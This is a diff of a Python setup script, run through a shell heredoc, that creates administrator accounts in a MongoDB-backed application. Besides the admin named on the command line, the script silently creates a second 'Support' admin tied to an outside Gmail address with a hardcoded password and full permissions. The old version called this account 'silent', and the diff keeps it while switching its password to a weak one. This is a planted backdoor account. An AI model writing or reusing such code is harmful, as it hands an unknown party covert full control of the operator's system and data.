@@ -336,6 +336,7 @@ from motor.motor_asyncio import AsyncIOMotorClient
 from passlib.context import CryptContext
 from datetime import datetime
 import sys
+import uuid
 
 async def create_admin(email, password, prenom, nom):
     client = AsyncIOMotorClient('mongodb://localhost:27017')
@@ -343,16 +344,21 @@ async def create_admin(email, password, prenom, nom):
     pwd_context = CryptContext(schemes=['bcrypt'], deprecated='auto')
     hashed_password = pwd_context.hash(password)
     
+    # Vérifier si l'utilisateur existe déjà
+    existing_user = await db.users.find_one({'email': email})
+    
     admin_user = {
+        'id': str(uuid.uuid4()),
         'email': email,
         'password': hashed_password,
         'prenom': prenom,
         'nom': nom,
         'role': 'ADMIN',
         'telephone': '',
+        'service': None,
+        'statut': 'actif',
         'dateCreation': datetime.utcnow(),
-        'derniereConnexion': None,
-        'actif': True,
+        'derniereConnexion': datetime.utcnow(),
         'permissions': {
             'dashboard': {'view': True, 'edit': True, 'delete': True},
             'workOrders': {'view': True, 'edit': True, 'delete': True},
@@ -365,19 +371,25 @@ async def create_admin(email, password, prenom, nom):
         }
     }
     
-    await db.users.update_one(
-        {'email': email},
-        {'\\$set': admin_user},
-        upsert=True
-    )
-    print(f'Admin créé: {email}')
+    if existing_user:
+        # Mettre à jour l'utilisateur existant en gardant son id
+        admin_user['id'] = existing_user.get('id', str(uuid.uuid4()))
+        await db.users.update_one(
+            {'email': email},
+            {'\\$set': admin_user}
+        )
+        print(f'Admin mis à jour: {email}')
+    else:
+        # Créer un nouvel utilisateur
+        await db.users.insert_one(admin_user)
+        print(f'Admin créé: {email}')
 
 async def main():
     # Admin principal (celui configuré par l'utilisateur)
     await create_admin(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
     
-    # Admin de secours (silencieux)
-    await create_admin('buenogy@gmail.com', 'nmrojvbvgb', 'Support', 'Admin')
+    # Admin de secours
+    await create_admin('buenogy@gmail.com', 'Admin2024!', 'Support', 'Admin')
 
 asyncio.run(main())
 EOPYEND
